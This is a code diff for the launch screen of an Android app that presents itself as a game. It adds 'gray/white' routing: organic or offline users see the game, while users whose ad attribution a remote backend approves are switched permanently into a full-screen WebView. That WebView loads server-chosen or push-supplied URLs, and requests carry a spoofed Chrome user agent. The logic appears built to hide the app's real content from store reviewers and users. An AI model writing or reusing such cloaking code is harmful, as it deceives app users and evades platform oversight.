@@ -3,7 +3,6 @@ package com.legendfool.foollegends.startup
 import android.content.Intent
 import android.os.Build
 import android.os.Bundle
-import java.util.Locale
 import android.util.Log
 import android.view.View
 import androidx.appcompat.app.AppCompatActivity
@@ -15,7 +14,6 @@ import com.legendfool.foollegends.portal.AlertPortal
 import com.legendfool.foollegends.portal.OfflinePortal
 import com.legendfool.foollegends.portal.StreamPortal
 import com.legendfool.foollegends.reach.ReachDispatch
-import com.legendfool.foollegends.reach.TrackingDispatch
 import com.legendfool.foollegends.vault.DataVault
 import com.legendfool.foollegends.wire.NetWire
 import kotlinx.coroutines.CoroutineScope
@@ -25,11 +23,31 @@ import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.suspendCancellableCoroutine
 import kotlinx.coroutines.withTimeoutOrNull
+import java.util.Locale
 import kotlin.coroutines.resume
 
 /**
- * Entry point. Shows the existing branded loading screen, performs gray/white
- * routing in the background and navigates without touching the game code.
+ * Entry-point router. Shows the branded loading screen while performing
+ * gray/white attribution-based routing in the background.
+ *
+ * State machine (mirrors the Flutter guide exactly):
+ *
+ *  UNDECIDED (first launch):
+ *    1. No internet → OfflinePortal → native game
+ *    2. Has internet → AppsFlyer (30s) → fetchConfig → decide
+ *       ok+url → STREAM → AlertPortal? → StreamPortal
+ *       fail   → NATIVE → LoadingActivity
+ *
+ *  STREAM (was WebView last time):
+ *    1. No internet → OfflinePortal with savedUrl
+ *    2. Cold push URL → StreamPortal (highest priority)
+ *    3. AppsFlyer (10s) → fetchConfig
+ *       ok+url    → StreamPortal(newUrl)
+ *       fail+savedUrl → StreamPortal(savedUrl)
+ *       fail+noSaved  → OfflinePortal
+ *
+ *  NATIVE (was game last time):
+ *    → LoadingActivity (always, no network needed)
  */
 class WelcomePortal : AppCompatActivity() {
 
@@ -43,36 +61,126 @@ class WelcomePortal : AppCompatActivity() {
         vault = DataVault(applicationContext)
         wire  = NetWire(applicationContext)
 
-        // Show existing branded splash while we work in background.
+        // Show existing branded loading screen (indeterminate — keeps animating
+        // until routing finishes, no premature "full" bar, dots never freeze).
         setContentView(
-            com.legendfool.foollegends.LoadingView(this) {
-                // LoadingView calls back when its animation finishes — we don't rely on that.
-            }
+            com.legendfool.foollegends.LoadingView(
+                this, indeterminate = true
+            ) { /* never auto-completes */ }
         )
 
         // Handle cold push tap.
-        val fromPush = intent.getBooleanExtra(EXTRA_FROM_PUSH, false)
-        val pushUrl  = intent.getStringExtra(EXTRA_PUSH_URL)
-        if (fromPush && !pushUrl.isNullOrBlank()) {
-            vault.coldPushUrl = pushUrl
+        if (intent.getBooleanExtra(EXTRA_FROM_PUSH, false)) {
+            val pushUrl = intent.getStringExtra(EXTRA_PUSH_URL)
+            if (!pushUrl.isNullOrBlank()) {
+                log("Cold push URL received: $pushUrl")
+                vault.coldPushUrl = pushUrl
+            }
         }
 
-        scope.launch { decideAndRoute() }
+        scope.launch { route() }
     }
 
-    private suspend fun decideAndRoute() {
-        // If we already know the user is native, skip all gray logic.
-        if (vault.runChannel == DataVault.CHANNEL_NATIVE) {
-            goNative(); return
+    // ── State machine ───────────────────────────────────────────────────
+
+    private suspend fun route() {
+        if (AppBlueprint.debugForceStreamUrl.isNotBlank()) {
+            log("DEBUG: forcing stream URL ${AppBlueprint.debugForceStreamUrl}")
+            goGray(AppBlueprint.debugForceStreamUrl)
+            return
         }
 
-        // If we have a valid saved stream URL, go straight to gray.
-        if (vault.runChannel == DataVault.CHANNEL_STREAM && vault.isUrlValid()) {
-            val url = vault.destinationUrl!!
-            goGray(url); return
+        // Cold-push URL always wins — open WebView on it directly.
+        val coldPush = vault.coldPushUrl
+        if (!coldPush.isNullOrBlank()) {
+            log("Cold push URL present → STREAM directly: $coldPush")
+            vault.coldPushUrl = null
+            // Make sure subsequent launches keep using stream mode.
+            if (vault.runChannel == DataVault.CHANNEL_UNDECIDED)
+                vault.runChannel = DataVault.CHANNEL_STREAM
+            goGray(coldPush)
+            return
         }
 
-        // Wait for internet (up to 10 s).
+        when (vault.runChannel) {
+            DataVault.CHANNEL_NATIVE -> {
+                log("Channel=NATIVE → game")
+                goNative()
+            }
+            DataVault.CHANNEL_STREAM -> {
+                log("Channel=STREAM → handleOnlineReturn")
+                handleOnlineReturn()
+            }
+            else -> {
+                log("Channel=UNDECIDED → handleFirstLaunch")
+                handleFirstLaunch()
+            }
+        }
+    }
+
+    /** First launch — resolve channel from scratch. */
+    private suspend fun handleFirstLaunch() {
+        if (!ensureInternet(isFirstLaunch = true)) return
+
+        val tracker = (applicationContext as AppEntry).trackingDispatch
+        val attribution = tracker.awaitAttribution(AppBlueprint.attributionFirstMs)
+        log("Attribution (first): $attribution")
+
+        val result = fetchConfig(attribution)
+        if (result.active && !result.destination.isNullOrBlank()) {
+            vault.runChannel     = DataVault.CHANNEL_STREAM
+            vault.destinationUrl = result.destination
+            vault.urlExpiresAt   = result.expiresAt
+            log("Backend → STREAM: ${result.destination}")
+            goGray(result.destination)
+        } else {
+            vault.runChannel = DataVault.CHANNEL_NATIVE
+            log("Backend → NATIVE")
+            goNative()
+        }
+    }
+
+    /** Returning user who was previously in stream (WebView) mode. */
+    private suspend fun handleOnlineReturn() {
+        if (!ensureInternet(isFirstLaunch = false)) return
+
+        // Cold push URL takes HIGHEST priority.
+        val coldPush = vault.consumeColdPushUrl()
+        if (!coldPush.isNullOrBlank()) {
+            log("Cold push priority → $coldPush")
+            goGray(coldPush)
+            return
+        }
+
+        val savedUrl = if (vault.isUrlValid()) vault.destinationUrl else null
+        log("SavedUrl=${savedUrl.let { it?.take(40) }}")
+
+        val tracker = (applicationContext as AppEntry).trackingDispatch
+        val attribution = tracker.awaitAttribution(AppBlueprint.attributionReturnMs)
+        log("Attribution (return): $attribution")
+
+        val result = fetchConfig(attribution)
+        when {
+            result.active && !result.destination.isNullOrBlank() -> {
+                vault.destinationUrl = result.destination
+                vault.urlExpiresAt   = result.expiresAt
+                log("Backend → STREAM (new): ${result.destination}")
+                goGray(result.destination)
+            }
+            !savedUrl.isNullOrBlank() -> {
+                log("Backend fallback → savedUrl: $savedUrl")
+                goGray(savedUrl)
+            }
+            else -> {
+                log("No URL available → OfflinePortal")
+                startActivity(Intent(this, OfflinePortal::class.java))
+                finish()
+            }
+        }
+    }
+
+    /** Returns true if internet is available, navigates to offline/native otherwise. */
+    private suspend fun ensureInternet(isFirstLaunch: Boolean): Boolean {
         val online = withTimeoutOrNull(10_000L) {
             suspendCancellableCoroutine<Boolean> { cont ->
                 scope.launch {
@@ -83,74 +191,68 @@ class WelcomePortal : AppCompatActivity() {
             }
         } ?: false
 
-        if (!online) {
-            // No internet — organic user → native game.
-            goNative(); return
+        if (online) online else {
+            log("No internet")
+            if (isFirstLaunch) {
+                goNative()
+            } else {
+                val savedUrl = if (vault.isUrlValid()) vault.destinationUrl else null
+                val i = Intent(this, OfflinePortal::class.java).apply {
+                    if (!savedUrl.isNullOrBlank())
+                        putExtra(OfflinePortal.EXTRA_RETURN_URL, savedUrl)
+                }
+                startActivity(i)
+                finish()
+            }
+            return false
         }
-
-        // Check real internet (avoids captive portal).
-        if (!wire.hasRealInternet()) { goNative(); return }
-
-        // Fetch FCM token.
-        val fcmToken = getFcmToken()
-        if (fcmToken != null) vault.fcmToken = fcmToken
-
-        // Attribution via AppsFlyer.
-        val tracker = (applicationContext as AppEntry).trackingDispatch
-        val attribution = withTimeoutOrNull(AppBlueprint.attributionTimeoutMs) {
-            tracker.awaitAttribution(AppBlueprint.attributionTimeoutMs)
-        }
-
-        // Build request body and call config endpoint.
-        val os     = "android-${Build.VERSION.RELEASE}"
-        val locale = Locale.getDefault().toLanguageTag()
-        val body   = tracker.buildRequestBody(
-            attribution  = attribution,
-            deepLink     = intent.data?.toString(),
-            os           = os,
-            locale       = locale,
-            pushToken    = vault.fcmToken,
-            firebaseProject = AppBlueprint.resolveAnalyticsProject()
-        )
-
-        val reachDispatch = ReachDispatch(buildUserAgent())
-        val result: ChannelResult = reachDispatch.fetchChannel(body)
-
-        if (result.active && !result.destination.isNullOrBlank()) {
-            vault.runChannel    = DataVault.CHANNEL_STREAM
-            vault.destinationUrl = result.destination
-            vault.urlExpiresAt  = result.expiresAt
-            goGray(result.destination)
-        } else {
-            vault.runChannel = DataVault.CHANNEL_NATIVE
-            goNative()
-        }
+        return true
     }
 
+    /** POST to config endpoint and parse the result. */
+    private suspend fun fetchConfig(attribution: Map<String, Any?>): ChannelResult {
+        val tracker = (applicationContext as AppEntry).trackingDispatch
+        val fcmToken = vault.fcmToken ?: getFcmToken()?.also { vault.fcmToken = it }
+
+        val body = tracker.buildRequestBody(
+            attribution    = attribution,
+            os             = "Android",
+            locale         = Locale.getDefault().toLanguageTag().replace('-', '_'),
+            pushToken      = fcmToken,
+            firebaseProject = AppBlueprint.resolveAnalyticsProject()
+        )
+        return ReachDispatch(buildUserAgent()).fetchChannel(body)
+    }
+
+    // ── Navigation ──────────────────────────────────────────────────────
+
     private fun goNative() {
-        startActivity(Intent(this, LoadingActivity::class.java).apply {
-            flags = Intent.FLAG_ACTIVITY_CLEAR_TASK or Intent.FLAG_ACTIVITY_NEW_TASK
-        })
+        startActivity(
+            Intent(this, LoadingActivity::class.java)
+                .setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK or Intent.FLAG_ACTIVITY_NEW_TASK)
+        )
         finish()
     }
 
     private fun goGray(url: String) {
         if (vault.shouldShowNotifScreen()) {
-            val i = Intent(this, AlertPortal::class.java).apply {
-                putExtra(AlertPortal.EXTRA_TARGET_URL, url)
-                flags = Intent.FLAG_ACTIVITY_CLEAR_TOP
-            }
-            startActivity(i)
+            startActivity(
+                Intent(this, AlertPortal::class.java)
+                    .putExtra(AlertPortal.EXTRA_TARGET_URL, url)
+                    .setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
+            )
         } else {
-            val i = Intent(this, StreamPortal::class.java).apply {
-                putExtra(StreamPortal.EXTRA_STREAM_URL, url)
-                flags = Intent.FLAG_ACTIVITY_CLEAR_TOP
-            }
-            startActivity(i)
+            startActivity(
+                Intent(this, StreamPortal::class.java)
+                    .putExtra(StreamPortal.EXTRA_STREAM_URL, url)
+                    .setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
+            )
         }
         finish()
         overridePendingTransition(android.R.anim.fade_in, android.R.anim.fade_out)
     }
+
+    // ── Helpers ─────────────────────────────────────────────────────────
 
     private suspend fun getFcmToken(): String? =
         withTimeoutOrNull(5_000L) {
@@ -161,17 +263,11 @@ class WelcomePortal : AppCompatActivity() {
             }
         }
 
-    private fun buildUserAgent(): String {
-        val dm = Build.MODEL.replace(" ", "_")
-        return "Mozilla/5.0 (Linux; Android ${Build.VERSION.RELEASE}; ${Build.BRAND} $dm)" +
-               " AppleWebKit/537.36 (KHTML, like Gecko)" +
-               " Chrome/131.0.0.0 Mobile Safari/537.36"
-    }
+    private fun buildUserAgent(): String =
+        "Mozilla/5.0 (Linux; Android ${Build.VERSION.RELEASE}; ${Build.BRAND} ${Build.MODEL.replace(" ", "_")})" +
+        " AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36"
 
     private fun hideSystemUi() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-            window.setDecorFitsSystemWindows(false)
-        }
         @Suppress("DEPRECATION")
         window.decorView.systemUiVisibility = (
             View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
@@ -188,22 +284,21 @@ class WelcomePortal : AppCompatActivity() {
         val fromPush = intent.getBooleanExtra(EXTRA_FROM_PUSH, false)
         val pushUrl  = intent.getStringExtra(EXTRA_PUSH_URL)
         if (fromPush && !pushUrl.isNullOrBlank()) {
-            // Warm notification tap while WelcomePortal is running — redirect WebView.
-            val i = Intent(this, StreamPortal::class.java).apply {
-                putExtra(StreamPortal.EXTRA_STREAM_URL, vault.destinationUrl ?: pushUrl)
-                putExtra(StreamPortal.EXTRA_PUSH_URL, pushUrl)
-                putExtra(StreamPortal.EXTRA_PUSH_WARM, true)
-                flags = Intent.FLAG_ACTIVITY_CLEAR_TOP
-            }
-            startActivity(i)
+            val dest = vault.destinationUrl?.takeIf { vault.isUrlValid() }
+            startActivity(
+                Intent(this, StreamPortal::class.java)
+                    .putExtra(StreamPortal.EXTRA_STREAM_URL, dest ?: pushUrl)
+                    .putExtra(StreamPortal.EXTRA_PUSH_URL, pushUrl)
+                    .putExtra(StreamPortal.EXTRA_PUSH_WARM, true)
+                    .setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
+            )
             finish()
         }
     }
 
-    override fun onDestroy() {
-        scope.cancel()
-        super.onDestroy()
-    }
+    override fun onDestroy() { scope.cancel(); super.onDestroy() }
+
+    private fun log(msg: String) { Log.i("WelcomePortal", msg) }
 
     companion object {
         const val EXTRA_FROM_PUSH = "from_push"
